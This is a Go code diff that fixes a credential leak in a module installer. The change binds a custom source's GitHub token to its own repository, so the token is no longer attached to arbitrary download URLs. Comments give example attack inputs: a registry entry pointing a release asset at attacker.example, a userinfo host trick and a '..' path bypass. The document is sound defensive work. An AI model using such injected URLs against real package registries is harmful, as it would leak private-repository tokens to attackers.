@@ -10,6 +10,7 @@ import (
 	"io"
 	"log"
 	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
 	"regexp"
@@ -309,14 +310,18 @@ func Install(ctx context.Context, d Deps, entry store.Entry) error {
 	sha256URL := zipURL + ".sha256"
 	sigURL := zipURL + ".sig"
 
-	// A private custom source needs its GitHub PAT on every download below.
+	// A private custom source needs its GitHub PAT on the downloads below.
 	// Resolved fresh from custom_sources here rather than carried on entry -
 	// module_registry (what entry is cached from) never stores credentials,
-	// see db.CustomSourceRow's doc comment. "" for official/community and for
-	// a custom source added without a token (public repo) - downloadFile
-	// treats an empty token as "no Authorization header", same as before this
-	// existed.
-	token := resolveCustomSourceToken(ctx, d.DB, entry.Source, entry.SourceRepo, entry.Name, "install")
+	// see db.CustomSourceRow's doc comment. Zero value for official/community
+	// and for a custom source added without a token (public repo) -
+	// downloadFile treats that as "no Authorization header".
+	//
+	// Note this is a credential bound to entry.SourceRepo, not a bare token:
+	// zipURL/sigURL above can come straight from registry.json, which the
+	// source repo controls, so downloadFile decides per URL whether the token
+	// may travel with it. See githubCredential.
+	cred := resolveCustomSourceCredential(ctx, d.DB, entry.Source, entry.SourceRepo, entry.Name, "install")
 
 	// ── 3. Download ZIP + SHA256 in parallel ──────────────────────────────
 	tmpDir, err := os.MkdirTemp("", "modulab-install-"+entry.Name+"-*")
@@ -341,8 +346,8 @@ func Install(ctx context.Context, d Deps, entry store.Entry) error {
 	dlCtx, dlCancel := context.WithTimeout(ctx, installDownloadTimeout)
 	defer dlCancel()
 
-	go func() { zipCh <- dlResult{downloadFile(dlCtx, zipURL, zipPath, maxZIPBytes, token)} }()
-	go func() { hashCh <- dlResult{downloadFile(dlCtx, sha256URL, sha256Path, maxSHA256FileBytes, token)} }()
+	go func() { zipCh <- dlResult{downloadFile(dlCtx, zipURL, zipPath, maxZIPBytes, cred)} }()
+	go func() { hashCh <- dlResult{downloadFile(dlCtx, sha256URL, sha256Path, maxSHA256FileBytes, cred)} }()
 
 	if r := <-zipCh; r.err != nil {
 		return fmt.Errorf("modules: install %q: download zip: %w", entry.Name, r.err)
@@ -373,7 +378,7 @@ func Install(ctx context.Context, d Deps, entry store.Entry) error {
 	cosignSkipped := false
 	if entry.CosignSigURL != "" {
 		// Bundle URL explicitly provided — download and verify.
-		if err := downloadFile(dlCtx, entry.CosignSigURL, sigPath, maxSigFileBytes, token); err != nil {
+		if err := downloadFile(dlCtx, entry.CosignSigURL, sigPath, maxSigFileBytes, cred); err != nil {
 			return fmt.Errorf("modules: install %q: download cosign bundle: %w", entry.Name, err)
 		}
 		ok, err := VerifyCosign(zipPath, sigPath, entry.CosignPubKey, d.CosignBin)
@@ -388,7 +393,7 @@ func Install(ctx context.Context, d Deps, entry store.Entry) error {
 		// admin-entered key for that repo); empty for community, which falls
 		// back to the embedded official key inside VerifyCosign and - as
 		// expected - will not verify against it, ending up cosignSkipped.
-		if dlErr := downloadFile(dlCtx, sigURL, sigPath, maxSigFileBytes, token); dlErr == nil {
+		if dlErr := downloadFile(dlCtx, sigURL, sigPath, maxSigFileBytes, cred); dlErr == nil {
 			ok, err := VerifyCosign(zipPath, sigPath, entry.CosignPubKey, d.CosignBin)
 			if err == nil {
 				cosignVerified = ok
@@ -669,25 +674,138 @@ func InstallManual(ctx context.Context, d Deps, zipPath string) error {
 
 // ── Helpers ──────────────────────────────────────────────────────────────────
 
-// resolveCustomSourceToken looks up the GitHub PAT for a private custom
-// source, or "" for anything else (official, community, or a custom source
-// added without a token). Errors are logged and swallowed, not returned -
-// worst case a private repo's download 404s downstream with a clear error,
-// same failure mode as a token that was simply never configured; this must
-// never abort an install/update over a lookup hiccup.
-func resolveCustomSourceToken(ctx context.Context, pool *db.Pool, source, sourceRepo, name, action string) string {
-	if source != "custom" {
+// githubCredential is a custom source's GitHub PAT bound to the single
+// repository it may ever be sent for.
+//
+// The binding is the whole point, and it is a security boundary, not
+// bookkeeping. This used to be a bare `token string` handed to downloadFile,
+// which attached it as an Authorization header to whatever URL it was given.
+// Those URLs are not Core's to choose: entry.ReleaseAsset and
+// entry.CosignSigURL are copied verbatim out of the custom source repo's own
+// registry.json (see store.FetchCustomRepo), and Install/Update use
+// ReleaseAsset directly whenever it is already absolute. A malicious or
+// compromised custom source could therefore publish
+//
+//	"release_asset": "https://attacker.example/x.zip"
+//
+// and Core would hand the admin's PAT straight to attacker.example on the
+// next install or update - a full credential leak, with read access to
+// every private repo that token covers. Found in the 2026-07-27 security
+// audit.
+//
+// authorizes below is what closes that: the token travels only to
+// github.com/api.github.com, and only for this exact owner/repo. Anything
+// else is fetched anonymously, which for an attacker-controlled URL is
+// simply an ordinary unauthenticated download.
+type githubCredential struct {
+	token string
+	// repo is the "owner/name" path this token was configured for, derived
+	// from the custom source's repo_url column - already validated as
+	// https://github.com/<owner>/<repo> by isValidGithubRepoURL when the
+	// source was added, so it can be trusted here in a way registry.json's
+	// contents cannot.
+	repo string
+}
+
+// authorizes reports whether rawURL may carry c's token.
+//
+// Deliberately an allowlist of two exact hosts plus a repo-path prefix,
+// rather than any attempt to detect "suspicious" URLs: the only URLs that
+// can legitimately need this credential are GitHub's own release-download
+// and release-API endpoints for c.repo. Everything else - a different host,
+// a different repository, plain http, a userinfo trick like
+// https://github.com@evil.example/ (url.Parse puts github.com in User and
+// evil.example in Host, so the switch below correctly rejects it) - falls
+// through to false and is fetched with no Authorization header at all.
+//
+// Host and repo are compared case-insensitively: GitHub treats owner/repo
+// names as case-insensitive, and repo_url is whatever casing the admin
+// typed, so a case difference against registry.json is a false negative
+// worth avoiding - it costs nothing, since both spellings address the same
+// repository anyway.
+func (c githubCredential) authorizes(rawURL string) bool {
+	if c.token == "" || c.repo == "" {
+		return false
+	}
+	u, err := url.Parse(rawURL)
+	if err != nil || u.Scheme != "https" {
+		return false
+	}
+	// url.Parse does not normalize the path, so a ".." segment would let a
+	// prefix match on <repo>/ survive a URL that GitHub itself resolves to a
+	// different repository ("/acme/modules/../../other/..."). That is not a
+	// credential leak - the token still only reaches github.com either way -
+	// but it would silently defeat the repo half of this check, so reject it
+	// rather than reason about it. u.Path is the decoded form, so this covers
+	// a %2e%2e-encoded attempt in the same test.
+	if strings.Contains(u.Path, "..") {
+		return false
+	}
+	path := strings.ToLower(strings.TrimPrefix(u.Path, "/"))
+	repo := strings.ToLower(c.repo)
+	switch strings.ToLower(u.Host) {
+	case "github.com":
+		// https://github.com/OWNER/REPO/releases/download/TAG/FILE
+		return strings.HasPrefix(path, repo+"/")
+	case "api.github.com":
+		// https://api.github.com/repos/OWNER/REPO/releases/...
+		return strings.HasPrefix(path, "repos/"+repo+"/")
+	default:
+		return false
+	}
+}
+
+// githubRepoPath extracts the "owner/name" path out of a validated
+// https://github.com/<owner>/<repo> URL, or "" if repoURL is not one. Mirrors
+// store.isValidGithubRepoURL's shape - kept as its own small function here so
+// githubCredential.repo can never silently end up holding a full URL (which
+// would make every authorizes prefix check fail closed, but confusingly).
+func githubRepoPath(repoURL string) string {
+	const prefix = "https://github.com/"
+	if !strings.HasPrefix(repoURL, prefix) {
 		return ""
+	}
+	rest := strings.TrimSuffix(strings.TrimPrefix(repoURL, prefix), "/")
+	parts := strings.Split(rest, "/")
+	if len(parts) != 2 || parts[0] == "" || parts[1] == "" {
+		return ""
+	}
+	return parts[0] + "/" + parts[1]
+}
+
+// resolveCustomSourceCredential looks up the GitHub PAT for a private custom
+// source and binds it to that source's own repository (see githubCredential).
+// Returns the zero value - "no credential, download anonymously" - for
+// anything else: official, community, a custom source added without a token,
+// or a repo_url that does not parse as a GitHub owner/repo pair. Errors are
+// logged and swallowed, not returned - worst case a private repo's download
+// 404s downstream with a clear error, same failure mode as a token that was
+// simply never configured; this must never abort an install/update over a
+// lookup hiccup.
+func resolveCustomSourceCredential(ctx context.Context, pool *db.Pool, source, sourceRepo, name, action string) githubCredential {
+	if source != "custom" {
+		return githubCredential{}
 	}
 	row, found, err := pool.GetCustomSourceByRepoURL(ctx, sourceRepo)
 	if err != nil {
 		log.Printf("modules: %s %q: resolve custom source token: %v", action, name, err)
-		return ""
+		return githubCredential{}
 	}
-	if !found {
-		return ""
+	if !found || row.Token == "" {
+		return githubCredential{}
 	}
-	return row.Token
+	repo := githubRepoPath(sourceRepo)
+	if repo == "" {
+		// Unreachable for any source added through AddCustomSourceHandler
+		// (isValidGithubRepoURL rejects anything else), so this is a
+		// defensive fail-closed rather than an expected path: without a repo
+		// to bind to, the token has no URL it is allowed to travel to, and
+		// dropping it here is strictly safer than carrying an unbound one.
+		log.Printf("modules: %s %q: custom source repo_url %q is not a github owner/repo URL - proceeding without token",
+			action, name, sourceRepo)
+		return githubCredential{}
+	}
+	return githubCredential{token: row.Token, repo: repo}
 }
 
 // githubReleaseDownloadPrefix marks a URL as GitHub's plain
@@ -714,7 +832,12 @@ const githubReleaseDownloadPrefix = "https://github.com/"
 // field (already an api.github.com/.../releases/assets/{id} URL), then GET
 // that URL with Accept: application/octet-stream - which is what
 // downloadFile does once this function hands it the resolved URL.
-func resolveGithubAssetURL(ctx context.Context, rawURL, token string) (string, error) {
+// cred is checked against the derived api.github.com URL before its token is
+// attached, exactly like downloadFile does for the asset download itself -
+// rawURL reaching this function already passed the same check, so this is a
+// belt-and-braces guard against a future caller that skips it, not a second
+// meaningful decision.
+func resolveGithubAssetURL(ctx context.Context, rawURL string, cred githubCredential) (string, error) {
 	rest := strings.TrimPrefix(rawURL, githubReleaseDownloadPrefix)
 	parts := strings.SplitN(rest, "/releases/download/", 2)
 	if len(parts) != 2 {
@@ -728,13 +851,16 @@ func resolveGithubAssetURL(ctx context.Context, rawURL, token string) (string, e
 	tag, filename := tagAndFile[0], tagAndFile[1]
 
 	apiURL := "https://api.github.com/repos/" + ownerRepo + "/releases/tags/" + tag
+	if !cred.authorizes(apiURL) {
+		return "", fmt.Errorf("refusing to send custom-source token to %s", apiURL)
+	}
 	req, err := http.NewRequestWithContext(ctx, http.MethodGet, apiURL, nil)
 	if err != nil {
 		return "", err
 	}
 	req.Header.Set("User-Agent", "modulab-core/1 (https://github.com/modulab-project/modulab-core)")
 	req.Header.Set("Accept", "application/vnd.github+json")
-	req.Header.Set("Authorization", "Bearer "+token)
+	req.Header.Set("Authorization", "Bearer "+cred.token)
 
 	resp, err := http.DefaultClient.Do(req)
 	if err != nil {
@@ -760,40 +886,57 @@ func resolveGithubAssetURL(ctx context.Context, rawURL, token string) (string, e
 	}
 	for _, a := range release.Assets {
 		if a.Name == filename {
+			// GitHub's own API returned this URL for a repo cred is already
+			// bound to, so it is an api.github.com/repos/<repo>/... URL by
+			// construction - re-checked anyway so downloadFile can never end
+			// up re-attaching the token to something unexpected further
+			// down, and so the failure reads as a refusal rather than as the
+			// bare 404 an un-authenticated retry would produce.
+			if !cred.authorizes(a.URL) {
+				return "", fmt.Errorf("release asset URL %q is outside %s", a.URL, cred.repo)
+			}
 			return a.URL, nil
 		}
 	}
 	return "", fmt.Errorf("asset %q not found in release %q", filename, tag)
 }
 
-// downloadFile fetches url and writes the body to path. Returns an error if
-// the response is not 2xx or the body exceeds maxBytes. token is an optional
-// GitHub PAT (see resolveCustomSourceToken) - sent as an Authorization
-// header when non-empty, so a private custom source's release assets
-// resolve instead of 404ing exactly like the public-source case.
+// downloadFile fetches rawURL and writes the body to path. Returns an error
+// if the response is not 2xx or the body exceeds maxBytes.
 //
-// When token is set and url is a plain github.com releases/download URL,
-// resolves it to the api.github.com asset URL first (resolveGithubAssetURL)
-// - required for private repos, harmless to redo for a public one, so this
-// isn't conditioned on the repo actually being private.
-func downloadFile(ctx context.Context, url, path string, maxBytes int64, token string) error {
+// cred is an optional custom-source GitHub PAT (see
+// resolveCustomSourceCredential). It is attached as an Authorization header
+// only when cred.authorizes(rawURL) - i.e. only for GitHub URLs belonging to
+// the very repository the token was configured for. Every other URL,
+// including one a compromised registry.json pointed at some third-party
+// host, is fetched anonymously; see githubCredential's doc comment for the
+// credential-leak this prevents.
+//
+// When cred applies and rawURL is a plain github.com releases/download URL,
+// it is resolved to the api.github.com asset URL first
+// (resolveGithubAssetURL) - required for private repos, harmless to redo for
+// a public one, so this isn't conditioned on the repo actually being
+// private. The re-check after that reassignment is deliberate: the URL being
+// authorized has changed, so the decision has to be made again against the
+// new one rather than carried over.
+func downloadFile(ctx context.Context, rawURL, path string, maxBytes int64, cred githubCredential) error {
 	acceptOctetStream := false
-	if token != "" && strings.HasPrefix(url, githubReleaseDownloadPrefix) && strings.Contains(url, "/releases/download/") {
-		resolved, err := resolveGithubAssetURL(ctx, url, token)
+	if cred.authorizes(rawURL) && strings.HasPrefix(rawURL, githubReleaseDownloadPrefix) && strings.Contains(rawURL, "/releases/download/") {
+		resolved, err := resolveGithubAssetURL(ctx, rawURL, cred)
 		if err != nil {
 			return fmt.Errorf("resolve private release asset: %w", err)
 		}
-		url = resolved
+		rawURL = resolved
 		acceptOctetStream = true
 	}
 
-	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
+	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
 	if err != nil {
 		return err
 	}
 	req.Header.Set("User-Agent", "modulab-core/1 (https://github.com/modulab-project/modulab-core)")
-	if token != "" {
-		req.Header.Set("Authorization", "Bearer "+token)
+	if cred.authorizes(rawURL) {
+		req.Header.Set("Authorization", "Bearer "+cred.token)
 	}
 	if acceptOctetStream {
 		req.Header.Set("Accept", "application/octet-stream")
@@ -805,12 +948,12 @@ func downloadFile(ctx context.Context, url, path string, maxBytes int64, token s
 	}
 	defer func() {
 		if err := resp.Body.Close(); err != nil {
-			log.Printf("modules: downloadFile: close response body for %s: %v", url, err)
+			log.Printf("modules: downloadFile: close response body for %s: %v", rawURL, err)
 		}
 	}()
 
 	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-		return fmt.Errorf("HTTP %d from %s", resp.StatusCode, url)
+		return fmt.Errorf("HTTP %d from %s", resp.StatusCode, rawURL)
 	}
 
 	f, err := os.Create(path)
@@ -833,7 +976,7 @@ func downloadFile(ctx context.Context, url, path string, maxBytes int64, token s
 		return err
 	}
 	if info.Size() > maxBytes {
-		return fmt.Errorf("response from %s exceeds %d byte limit", url, maxBytes)
+		return fmt.Errorf("response from %s exceeds %d byte limit", rawURL, maxBytes)
 	}
 	return nil
 }
